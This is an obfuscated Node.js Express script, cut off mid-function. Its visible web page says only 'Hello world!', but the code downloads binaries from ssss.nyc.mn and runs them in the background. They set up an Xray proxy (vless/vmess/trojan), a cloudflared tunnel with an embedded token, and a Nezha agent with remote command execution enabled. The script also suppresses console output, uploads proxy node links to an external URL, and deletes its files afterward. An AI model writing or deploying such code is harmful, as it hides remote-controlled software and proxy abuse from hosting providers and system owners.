const _0xbd079b=_0x5715;(function(_0x2155a2,_0x1544c7){const _0x47acce=_0x5715,_0x685af5=_0x2155a2();while(!![]){try{const _0x4269b3=-parseInt(_0x47acce(0x155))/0x1*(parseInt(_0x47acce(0xea))/0x2)+parseInt(_0x47acce(0xc7))/0x3+parseInt(_0x47acce(0xf4))/0x4*(-parseInt(_0x47acce(0xba))/0x5)+-parseInt(_0x47acce(0xa2))/0x6+parseInt(_0x47acce(0xe7))/0x7+-parseInt(_0x47acce(0x146))/0x8*(parseInt(_0x47acce(0x104))/0x9)+-parseInt(_0x47acce(0x10e))/0xa*(-parseInt(_0x47acce(0xae))/0xb);if(_0x4269b3===_0x1544c7)break;else _0x685af5['push'](_0x685af5['shift']());}catch(_0x5b05af){_0x685af5['push'](_0x685af5['shift']());}}}(_0x18a6,0xce6d7));const _0x17930f=(function(){let _0x17c3f5=!![];return function(_0x20b1d6,_0x1db4a2){const _0x5449f8=_0x17c3f5?function(){const _0xd167c1=_0x5715;if(_0x1db4a2){const _0x22c2b4=_0x1db4a2[_0xd167c1(0xb6)](_0x20b1d6,arguments);return _0x1db4a2=null,_0x22c2b4;}}:function(){};return _0x17c3f5=![],_0x5449f8;};}()),_0x4b3667=_0x17930f(this,function(){const _0x9841e0=_0x5715;return _0x4b3667[_0x9841e0(0xf0)]()[_0x9841e0(0x107)](_0x9841e0(0xcf))[_0x9841e0(0xf0)]()[_0x9841e0(0xcc)](_0x4b3667)[_0x9841e0(0x107)](_0x9841e0(0xcf));});_0x4b3667();const _0x8b28c=(function(){let _0x77beb=!![];return function(_0x3de195,_0x4b7581){const _0x1ddf55=_0x77beb?function(){const _0x4354d7=_0x5715;if(_0x4b7581){const _0x13cda2=_0x4b7581[_0x4354d7(0xb6)](_0x3de195,arguments);return _0x4b7581=null,_0x13cda2;}}:function(){};return _0x77beb=![],_0x1ddf55;};}()),_0x36942e=_0x8b28c(this,function(){const _0x2233a1=_0x5715;let _0x35ecd7;try{const _0x4a851b=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x35ecd7=_0x4a851b();}catch(_0x281b79){_0x35ecd7=window;}const _0x6f4b8b=_0x35ecd7['console']=_0x35ecd7[_0x2233a1(0xa9)]||{},_0x17ddc4=[_0x2233a1(0xd4),_0x2233a1(0xb3),'info',_0x2233a1(0xf3),_0x2233a1(0x150),_0x2233a1(0x128),_0x2233a1(0xe1)];for(let _0x55be5f=0x0;_0x55be5f<_0x17ddc4[_0x2233a1(0x124)];_0x55be5f++){const _0x31d462=_0x8b28c[_0x2233a1(0xcc)][_0x2233a1(0xb5)][_0x2233a1(0xed)](_0x8b28c),_0x295a36=_0x17ddc4[_0x55be5f],_0x5e25c0=_0x6f4b8b[_0x295a36]||_0x31d462;_0x31d462[_0x2233a1(0x157)]=_0x8b28c[_0x2233a1(0xed)](_0x8b28c),_0x31d462[_0x2233a1(0xf0)]=_0x5e25c0[_0x2233a1(0xf0)][_0x2233a1(0xed)](_0x5e25c0),_0x6f4b8b[_0x295a36]=_0x31d462;}});_0x36942e();const express=require(_0xbd079b(0x106)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0xbd079b(0x115)),{promisify}=require('util'),exec=promisify(require('child_process')[_0xbd079b(0x142)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0xbd079b(0x136)][_0xbd079b(0xe8)]||'',PROJECT_URL=process[_0xbd079b(0x136)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0xbd079b(0xd1)]||![],FILE_PATH=process['env'][_0xbd079b(0x14d)]||_0xbd079b(0xec),SUB_PATH=process['env'][_0xbd079b(0x11f)]||_0xbd079b(0x105),PORT=process['env'][_0xbd079b(0x13a)]||process['env'][_0xbd079b(0x117)]||0xbb8,UUID=process[_0xbd079b(0x136)][_0xbd079b(0x13f)]||'b7824086-6ba5-4d8d-950c-075e5132f326',NEZHA_SERVER=process[_0xbd079b(0x136)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0xbd079b(0x136)][_0xbd079b(0x121)]||'',NEZHA_KEY=process[_0xbd079b(0x136)][_0xbd079b(0xfb)]||'',ARGO_DOMAIN=process['env'][_0xbd079b(0x153)]||_0xbd079b(0xc5),ARGO_AUTH=process[_0xbd079b(0x136)]['ARGO_AUTH']||_0xbd079b(0x99),ARGO_PORT=process['env'][_0xbd079b(0xf7)]||0x1f41,CFIP=process[_0xbd079b(0x136)][_0xbd079b(0x127)]||_0xbd079b(0xd0),CFPORT=process[_0xbd079b(0x136)][_0xbd079b(0xf8)]||0x1bb,NAME=process[_0xbd079b(0x136)][_0xbd079b(0xd2)]||_0xbd079b(0x158);!fs[_0xbd079b(0x11b)](FILE_PATH)?(fs[_0xbd079b(0x12e)](FILE_PATH),console[_0xbd079b(0xd4)](FILE_PATH+_0xbd079b(0xaf))):console[_0xbd079b(0xd4)](FILE_PATH+_0xbd079b(0xc9));function generateRandomName(){const _0x2aee0e=_0xbd079b,_0x1974cf=_0x2aee0e(0xf2);let _0x54d129='';for(let _0x4035ce=0x0;_0x4035ce<0x6;_0x4035ce++){_0x54d129+=_0x1974cf[_0x2aee0e(0x138)](Math[_0x2aee0e(0xef)](Math['random']()*_0x1974cf[_0x2aee0e(0x124)]));}return _0x54d129;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x18a6(){const _0x1fb6f9=['push','test','post','del\x20/f\x20/q\x20','set','36230910IRyiiR','\x20failed:\x20','/api/delete-nodes','send','base64','stringify','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','path','close','PORT','\x20-c\x20\x22','https://arm64.ssss.nyc.mn/agent','443','existsSync','filter','?security=tls&sni=','from','SUB_PATH','vmess','NEZHA_PORT','listen','\x20>\x20nul\x202>&1','length','basename','pop','CFIP','table','unlinkSync','text/plain;\x20charset=utf-8','statSync','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','tcp','mkdirSync','then','quic','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','config.yaml','--tls','Empowerment\x20success\x20for\x20','2083','env','\x0a\x20\x20credentials-file:\x20','charAt','/tunnel.yml\x20run','SERVER_PORT','platform','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Download\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','UUID','pkill\x20-f\x20\x22[','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','exec','/trojan-argo','/dev/null','Add\x20automatic\x20access\x20task\x20faild:\x20','3920744hXkiNV','false','isFile','127.0.0.1','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','tunnel.yml','readdirSync','FILE_PATH','chmod','tls','exception','&fp=firefox&type=ws&host=','none','ARGO_DOMAIN','https://amd64.ssss.nyc.mn/web','13630vvkFIv','/api/add-subscriptions','__proto__','传说家宽','get','unshift','writeFileSync','clear','join','finish','https+local://8.8.8.8/dns-query','boot.log','eyJhIjoiZDM0NTAyNzA1OWU1ZmIwYTkxY2Q5ZjU3YTQwZjg2YWIiLCJ0IjoiM2U1MTQ0ZGEtZTVmMy00ODMxLTkzMzItMjUyYTI3YjcyYzk2IiwicyI6Ik9XVXpPR1EwTkRRdE1EVTVPUzAwT0Rnd0xXSmxORGd0WmpBMU1qWm1NMkk1TjJVNSJ9','message','/config.json\x20>/dev/null\x202>&1\x20&','\x20>/dev/null\x202>&1','substring','2096','/vmess-argo','unlink','\x22\x20>\x20/dev/null\x202>&1','9790320GfQTLh','map','&path=%2Fvless-argo%3Fed%3D2560#','http','match','https://amd64.ssss.nyc.mn/bot','createWriteStream','console','2053','aarch64','\x20is\x20running','https://oooo.serv00.net/add-url','11czGSGj','\x20is\x20created','/vless-argo','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','tunnel.json','warn','response','prototype','apply','pipe','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','automatic\x20access\x20task\x20added\x20successfully','10565HExjBu','\x20-c\x20','ArgoDomain:','forEach','2087','includes','\x0a\x20\x20tunnel:\x20','Nodes\x20uploaded\x20successfully','TunnelSecret','fileUrl','win32','ar.d.7.d.0.6.3.0.0.0.7.4.0.1.0.0.2.ip6.arpa','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','1423500pVfPih','Hello\x20world!','\x20already\x20exists','block','Content-Type','constructor','\x20>/dev/null\x202>&1\x20&','\x0aclient_secret:\x20','(((.+)+)+)+$','cdns.doon.eu.org','AUTO_ACCESS','NAME','all','log','arm','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','nohup\x20','\x20-s\x20','https://arm64.ssss.nyc.mn/bot','list.txt','Subscription\x20uploaded\x20successfully','Empowerment\x20failed\x20for\x20','freedom','readFileSync','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','trace','split','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','stream','fileName','sub.txt','7678720VWGylO','UPLOAD_URL','utf-8','36qTZwVX','https://arm64.ssss.nyc.mn/v1','./tmp','bind','Error\x20executing\x20command:\x20','floor','toString','App\x20is\x20running','abcdefghijklmnopqrstuvwxyz','error','2824DvQDUH','status','vless','ARGO_PORT','CFPORT','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Error\x20in\x20startserver:','NEZHA_KEY','Error\x20reading\x20boot.log:','8443','NEZHA\x20variable\x20is\x20empty,skip\x20running','true','\x20successfully','application/json','Unhandled\x20error\x20in\x20startserver:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','18OOSCjS','sub','express','search','\x0a\x20\x20\x20\x20'];_0x18a6=function(){return _0x1fb6f9;};return _0x18a6();}let npmPath=path[_0xbd079b(0x95)](FILE_PATH,npmName),phpPath=path[_0xbd079b(0x95)](FILE_PATH,phpName),webPath=path[_0xbd079b(0x95)](FILE_PATH,webName),botPath=path[_0xbd079b(0x95)](FILE_PATH,botName),subPath=path[_0xbd079b(0x95)](FILE_PATH,_0xbd079b(0xe6)),listPath=path[_0xbd079b(0x95)](FILE_PATH,_0xbd079b(0xda)),bootLogPath=path[_0xbd079b(0x95)](FILE_PATH,_0xbd079b(0x98)),configPath=path[_0xbd079b(0x95)](FILE_PATH,'config.json');function deleteNodes(){const _0x2129a2=_0xbd079b;try{if(!UPLOAD_URL)return;if(!fs[_0x2129a2(0x11b)](subPath))return;let _0x43f9af;try{_0x43f9af=fs[_0x2129a2(0xde)](subPath,_0x2129a2(0xe9));}catch{return null;}const _0x1b4349=Buffer['from'](_0x43f9af,'base64')[_0x2129a2(0xf0)](_0x2129a2(0xe9)),_0x326f2c=_0x1b4349['split']('\x0a')['filter'](_0xc06197=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xc06197));if(_0x326f2c[_0x2129a2(0x124)]===0x0)return;return axios[_0x2129a2(0x10b)](UPLOAD_URL+_0x2129a2(0x110),JSON[_0x2129a2(0x113)]({'nodes':_0x326f2c}),{'headers':{'Content-Type':_0x2129a2(0x101)}})['catch'](_0x16917f=>{return null;}),null;}catch(_0x219b94){return null;}}function cleanupOldFiles(){const _0x5e888f=_0xbd079b;try{const _0x3bfb36=fs[_0x5e888f(0x14c)](FILE_PATH);_0x3bfb36[_0x5e888f(0xbd)](_0x437788=>{const _0x2b92e8=_0x5e888f,_0x3d5197=path[_0x2b92e8(0x95)](FILE_PATH,_0x437788);try{const _0x5b790b=fs[_0x2b92e8(0x12b)](_0x3d5197);_0x5b790b[_0x2b92e8(0x148)]()&&fs['unlinkSync'](_0x3d5197);}catch(_0x58dff6){}});}catch(_0x2197fa){}}app[_0xbd079b(0x159)]('/',function(_0x230cce,_0x12ac85){const _0x67e1b0=_0xbd079b;_0x12ac85['send'](_0x67e1b0(0xc8));});async function generateConfig(){const _0x1bafc4=_0xbd079b,_0x3c8c11={'log':{'access':_0x1bafc4(0x144),'error':_0x1bafc4(0x144),'loglevel':_0x1bafc4(0x152)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1bafc4(0xf6),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x1bafc4(0x152),'fallbacks':[{'dest':0xbb9},{'path':_0x1bafc4(0xb0),'dest':0xbba},{'path':_0x1bafc4(0x9f),'dest':0xbbb},{'path':_0x1bafc4(0x143),'dest':0xbbc}]},'streamSettings':{'network':_0x1bafc4(0x12d)}},{'port':0xbb9,'listen':_0x1bafc4(0x149),'protocol':_0x1bafc4(0xf6),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x1bafc4(0x12d),'security':_0x1bafc4(0x152)}},{'port':0xbba,'listen':_0x1bafc4(0x149),'protocol':_0x1bafc4(0xf6),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x1bafc4(0x152),'wsSettings':{'path':_0x1bafc4(0xb0)}},'sniffing':{'enabled':!![],'destOverride':[_0x1bafc4(0xa5),_0x1bafc4(0x14f),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1bafc4(0x149),'protocol':_0x1bafc4(0x120),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1bafc4(0xa5),_0x1bafc4(0x14f),_0x1bafc4(0x130)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1bafc4(0x149),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x1bafc4(0x143)}},'sniffing':{'enabled':!![],'destOverride':[_0x1bafc4(0xa5),'tls',_0x1bafc4(0x130)],'metadataOnly':![]}}],'dns':{'servers':[_0x1bafc4(0x97)]},'outbounds':[{'protocol':_0x1bafc4(0xdd),'tag':'direct'},{'protocol':'blackhole','tag':_0x1bafc4(0xca)}]};fs[_0x1bafc4(0x93)](path[_0x1bafc4(0x95)](FILE_PATH,'config.json'),JSON['stringify'](_0x3c8c11,null,0x2));}function getSystemArchitecture(){const _0x28ee7d=_0xbd079b,_0x580dfd=os['arch']();return _0x580dfd===_0x28ee7d(0xd5)||_0x580dfd==='arm64'||_0x580dfd===_0x28ee7d(0xab)?_0x28ee7d(0xd5):'amd';}function downloadFile(_0x3e869d,_0x979a8e,_0x2aef67){const _0x52a380=_0xbd079b,_0x353323=_0x3e869d;!fs[_0x52a380(0x11b)](FILE_PATH)&&fs[_0x52a380(0x12e)](FILE_PATH,{'recursive':!![]});const _0x2bf212=fs[_0x52a380(0xa8)](_0x353323);axios({'method':_0x52a380(0x159),'url':_0x979a8e,'responseType':_0x52a380(0xe4)})[_0x52a380(0x12f)](_0x2acc64=>{const _0x1994a8=_0x52a380;_0x2acc64['data'][_0x1994a8(0xb7)](_0x2bf212),_0x2bf212['on'](_0x1994a8(0x96),()=>{const _0x19b990=_0x1994a8;_0x2bf212[_0x19b990(0x116)](),console['log'](_0x19b990(0x13d)+path['basename'](_0x353323)+_0x19b990(0x100)),_0x2aef67(null,_0x353323);}),_0x2bf212['on'](_0x1994a8(0xf3),_0x4cd638=>{const _0x5d10fb=_0x1994a8;fs[_0x5d10fb(0xa0)](_0x353323,()=>{});const _0x3773e8='Download\x20'+path['basename'](_0x353323)+_0x5d10fb(0x10f)+_0x4cd638['message'];console['error'](_0x3773e8),_0x2aef67(_0x3773e8);});})['catch'](_0x2c0852=>{const _0x14db7d=_0x52a380,_0x51df8c=_0x14db7d(0x13d)+path[_0x14db7d(0x125)](_0x353323)+_0x14db7d(0x10f)+_0x2c0852[_0x14db7d(0x9a)];console[_0x14db7d(0xf3)](_0x51df8c),_0x2aef67(_0x51df8c);});}async function downloadFilesAndRun(){const _0x3a2402=_0xbd079b,_0x29569e=getSystemArchitecture(),_0x2a7eb9=getFilesForArchitecture(_0x29569e);if(_0x2a7eb9[_0x3a2402(0x124)]===0x0){console[_0x3a2402(0xd4)](_0x3a2402(0xd6));return;}const _0x16b22c=_0x2a7eb9[_0x3a2402(0xa3)](_0x42001b=>{return new Promise((_0x2c0644,_0x30a7fb)=>{const _0xa12cd=_0x5715;downloadFile(_0x42001b[_0xa12cd(0xe5)],_0x42001b[_0xa12cd(0xc3)],(_0x2dcef3,_0x202e0d)=>{_0x2dcef3?_0x30a7fb(_0x2dcef3):_0x2c0644(_0x202e0d);});});});try{await Promise[_0x3a2402(0xd3)](_0x16b22c);}catch(_0x54fa49){console[_0x3a2402(0xf3)]('Error\x20downloading\x20files:',_0x54fa49);return;}function _0x17dc94(_0x1571ec){const _0x562417=0x1fd;_0x1571ec['forEach'](_0x4a6966=>{const _0x169276=_0x5715;fs[_0x169276(0x11b)](_0x4a6966)&&fs[_0x169276(0x14e)](_0x4a6966,_0x562417,_0x1eae69=>{const _0x968b78=_0x169276;_0x1eae69?console[_0x968b78(0xf3)](_0x968b78(0xdc)+_0x4a6966+':\x20'+_0x1eae69):console[_0x968b78(0xd4)](_0x968b78(0x134)+_0x4a6966+':\x20'+_0x562417[_0x968b78(0xf0)](0x8));});});}const _0x4d142f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x17dc94(_0x4d142f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5bbbdc=NEZHA_SERVER[_0x3a2402(0xbf)](':')?NEZHA_SERVER[_0x3a2402(0xe2)](':')[_0x3a2402(0x126)]():'',_0x5bca5b=new Set([_0x3a2402(0x11a),'8443',_0x3a2402(0x9e),_0x3a2402(0xbe),_0x3a2402(0x135),_0x3a2402(0xaa)]),_0x4299fa=_0x5bca5b['has'](_0x5bbbdc)?_0x3a2402(0xff):_0x3a2402(0x147),_0x126772=_0x3a2402(0xce)+NEZHA_KEY+_0x3a2402(0xe0)+NEZHA_SERVER+_0x3a2402(0x12c)+_0x4299fa+_0x3a2402(0x103)+UUID;fs[_0x3a2402(0x93)](path[_0x3a2402(0x95)](FILE_PATH,_0x3a2402(0x132)),_0x126772);const _0x46e478=_0x3a2402(0xd7)+phpPath+_0x3a2402(0x118)+FILE_PATH+_0x3a2402(0xb1);try{await exec(_0x46e478),console['log'](phpName+_0x3a2402(0xac)),await new Promise(_0x4c9d5f=>setTimeout(_0x4c9d5f,0x3e8));}catch(_0x113437){console[_0x3a2402(0xf3)]('php\x20running\x20error:\x20'+_0x113437);}}else{let _0x4a43c7='';const _0x1de217=[_0x3a2402(0x11a),_0x3a2402(0xfd),_0x3a2402(0x9e),_0x3a2402(0xbe),_0x3a2402(0x135),'2053'];_0x1de217['includes'](NEZHA_PORT)&&(_0x4a43c7=_0x3a2402(0x133));const _0x41d903=_0x3a2402(0xd7)+npmPath+_0x3a2402(0xd8)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4a43c7+_0x3a2402(0xf9);try{await exec(_0x41d903),console[_0x3a2402(0xd4)](npmName+_0x3a2402(0xac)),await new Promise(_0xe42f1=>setTimeout(_0xe42f1,0x3e8));}catch(_0x3712d0){console['error']('npm\x20running\x20error:\x20'+_0x3712d0);}}}else console[_0x3a2402(0xd4)](_0x3a2402(0xfe));const _0x44906b=_0x3a2402(0xd7)+webPath+_0x3a2402(0xbb)+FILE_PATH+_0x3a2402(0x9b);try{await exec(_0x44906b),console[_0x3a2402(0xd4)](webName+_0x3a2402(0xac)),await new Promise(_0x23bdcf=>setTimeout(_0x23bdcf,0x3e8));}catch(_0x1e14d3){console[_0x3a2402(0xf3)]('web\x20running\x20error:\x20'+_0x1e14d3);}if(fs['existsSync'](botPath)){let _0x3548b6;if(ARGO_AUTH[_0x3a2402(0xa6)](/^[A-Z0-9a-z=]{120,250}$/))_0x3548b6=_0x3a2402(0xb8)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x3548b6=_0x3a2402(0x13c)+FILE_PATH+_0x3a2402(0x139):_0x3548b6='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3a2402(0x141)+ARGO_PORT;try{await exec(_0x3a2402(0xd7)+botPath+'\x20'+_0x3548b6+_0x3a2402(0xcd)),console[_0x3a2402(0xd4)](botName+_0x3a2402(0xac)),await new Promise(_0x292ba3=>setTimeout(_0x292ba3,0x7d0));}catch(_0x3d2d9a){console[_0x3a2402(0xf3)](_0x3a2402(0xee)+_0x3d2d9a);}}await new Promise(_0x5181cb=>setTimeout(_0x5181cb,0x1388));}function _0x5715(_0x6ff0b9,_0x382f8f){const _0x144ed2=_0x18a6();return _0x5715=function(_0x36942e,_0x8b28c){_0x36942e=_0x36942e-0x92;let _0xa40e9a=_0x144ed2[_0x36942e];return _0xa40e9a;},_0x5715(_0x6ff0b9,_0x382f8f);}function getFilesForArchitecture(_0xfa5dd0){const _0x5661da=_0xbd079b;let _0x69eac4;_0xfa5dd0===_0x5661da(0xd5)?_0x69eac4=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x5661da(0xd9)}]:_0x69eac4=[{'fileName':webPath,'fileUrl':_0x5661da(0x154)},{'fileName':botPath,'fileUrl':_0x5661da(0xa7)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x11cb4e=_0xfa5dd0==='arm'?_0x5661da(0x119):'https://amd64.ssss.nyc.mn/agent';_0x69eac4['unshift']({'fileName':npmPath,'fileUrl':_0x11cb4e});}else{const _0x45c382=_0xfa5dd0===_0x5661da(0xd5)?_0x5661da(0xeb):'https://amd64.ssss.nyc.mn/v1';_0x69eac4[_0x5661da(0x92)]({'fileName':phpPath,'fileUrl':_0x45c382});}}return _0x69eac4;}function argoType(){const _0x39a0b0=_0xbd079b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x39a0b0(0xd4)](_0x39a0b0(0x13e));return;}if(ARGO_AUTH[_0x39a0b0(0xbf)](_0x39a0b0(0xc2))){fs['writeFileSync'](path[_0x39a0b0(0x95)](FILE_PATH,_0x39a0b0(0xb2)),ARGO_AUTH);const _0x266c0a=_0x39a0b0(0xc0)+ARGO_AUTH[_0x39a0b0(0xe2)]('\x22')[0xb]+_0x39a0b0(0x137)+path[_0x39a0b0(0x95)](FILE_PATH,_0x39a0b0(0xb2))+_0x39a0b0(0x14a)+ARGO_DOMAIN+_0x39a0b0(0xdf)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path['join'](FILE_PATH,_0x39a0b0(0x14b)),_0x266c0a);}else console[_0x39a0b0(0xd4)](_0x39a0b0(0x114));}argoType();async function extractDomains(){const _0x44f469=_0xbd079b;let _0x48e010;if(ARGO_AUTH&&ARGO_DOMAIN)_0x48e010=ARGO_DOMAIN,console[_0x44f469(0xd4)]('ARGO_DOMAIN:',_0x48e010),await _0x492aa8(_0x48e010);else try{const _0x2158e7=fs[_0x44f469(0xde)](path[_0x44f469(0x95)](FILE_PATH,_0x44f469(0x98)),_0x44f469(0xe9)),_0x53ec8a=_0x2158e7[_0x44f469(0xe2)]('\x0a'),_0x52c840=[];_0x53ec8a[_0x44f469(0xbd)](_0x5bd8a1=>{const _0x2f8ec6=_0x44f469,_0x3fd277=_0x5bd8a1['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3fd277){const _0x14847d=_0x3fd277[0x1];_0x52c840[_0x2f8ec6(0x109)](_0x14847d);}});if(_0x52c840[_0x44f469(0x124)]>0x0)_0x48e010=_0x52c840[0x0],console['log'](_0x44f469(0xbc),_0x48e010),await _0x492aa8(_0x48e010);else{console[_0x44f469(0xd4)](_0x44f469(0x131)),fs[_0x44f469(0x129)](path[_0x44f469(0x95)](FILE_PATH,'boot.log'));async function _0x23937c(){const _0x333084=_0x44f469;try{process[_0x333084(0x13b)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x333084(0x140)+botName[_0x333084(0x138)](0x0)+']'+botName[_0x333084(0x9d)](0x1)+_0x333084(0xa1));}catch(_0x4f58d0){}}_0x23937c(),await new Promise(_0x1d639=>setTimeout(_0x1d639,0xbb8));const _0x348a00=_0x44f469(0xe3)+FILE_PATH+_0x44f469(0x141)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x348a00+_0x44f469(0xcd)),console[_0x44f469(0xd4)](botName+'\x20is\x20running'),await new Promise(_0x206428=>setTimeout(_0x206428,0xbb8)),await extractDomains();}catch(_0x287d2a){console['error'](_0x44f469(0xee)+_0x287d2a);}}}catch(_0x185f13){console[_0x44f469(0xf3)](_0x44f469(0xfc),_0x185f13);}async function _0x492aa8(_0x4f023d){const _0x2541d8=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':'utf-8'}),_0x3b16e5=_0x2541d8['trim'](),_0x19daec=NAME?NAME+'-'+_0x3b16e5:_0x3b16e5;return new Promise(_0x4cb030=>{setTimeout(()=>{const _0x351ece=_0x5715,_0x2faa28={'v':'2','ps':''+_0x19daec,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x351ece(0x152),'net':'ws','type':_0x351ece(0x152),'host':_0x4f023d,'path':'/vmess-argo?ed=2560','tls':_0x351ece(0x14f),'sni':_0x4f023d,'alpn':'','fp':'firefox'},_0x5870fd='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x4f023d+'&fp=firefox&type=ws&host='+_0x4f023d+_0x351ece(0xa4)+_0x19daec+'\x0a\x20\x20\x0avmess://'+Buffer[_0x351ece(0x11e)](JSON[_0x351ece(0x113)](_0x2faa28))['toString'](_0x351ece(0x112))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x351ece(0x11d)+_0x4f023d+_0x351ece(0x151)+_0x4f023d+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x19daec+_0x351ece(0x108);console[_0x351ece(0xd4)](Buffer[_0x351ece(0x11e)](_0x5870fd)[_0x351ece(0xf0)](_0x351ece(0x112))),fs[_0x351ece(0x93)](subPath,Buffer[_0x351ece(0x11e)](_0x5870fd)[_0x351ece(0xf0)](_0x351ece(0x112))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x9cca44,_0x5cd226)=>{const _0x4aeda3=_0x351ece,_0xf11ba6=Buffer['from'](_0x5870fd)[_0x4aeda3(0xf0)](_0x4aeda3(0x112));_0x5cd226[_0x4aeda3(0x10d)](_0x4aeda3(0xcb),_0x4aeda3(0x12a)),_0x5cd226[_0x4aeda3(0x111)](_0xf11ba6);}),_0x4cb030(_0x5870fd);},0x7d0);});}}async function uploadNodes(){const _0x279a30=_0xbd079b;if(UPLOAD_URL&&PROJECT_URL){const _0x1fb036=PROJECT_URL+'/'+SUB_PATH,_0x57fb16={'subscription':[_0x1fb036]};try{const _0x341d13=await axios[_0x279a30(0x10b)](UPLOAD_URL+_0x279a30(0x156),_0x57fb16,{'headers':{'Content-Type':_0x279a30(0x101)}});return _0x341d13&&_0x341d13[_0x279a30(0xf5)]===0xc8?(console[_0x279a30(0xd4)](_0x279a30(0xdb)),_0x341d13):null;}catch(_0x93706f){if(_0x93706f[_0x279a30(0xb4)]){if(_0x93706f[_0x279a30(0xb4)][_0x279a30(0xf5)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x20d948=fs[_0x279a30(0xde)](listPath,_0x279a30(0xe9)),_0x2463b2=_0x20d948[_0x279a30(0xe2)]('\x0a')[_0x279a30(0x11c)](_0x1cf94d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x279a30(0x10a)](_0x1cf94d));if(_0x2463b2[_0x279a30(0x124)]===0x0)return;const _0x213992=JSON['stringify']({'nodes':_0x2463b2});try{const _0x569801=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x213992,{'headers':{'Content-Type':'application/json'}});return _0x569801&&_0x569801[_0x279a30(0xf5)]===0xc8?(console[_0x279a30(0xd4)](_0x279a30(0xc1)),_0x569801):null;}catch(_0x14e438){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1b4a8d=_0x5715,_0x4b0f33=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4b0f33[_0x1b4a8d(0x109)](npmPath);else 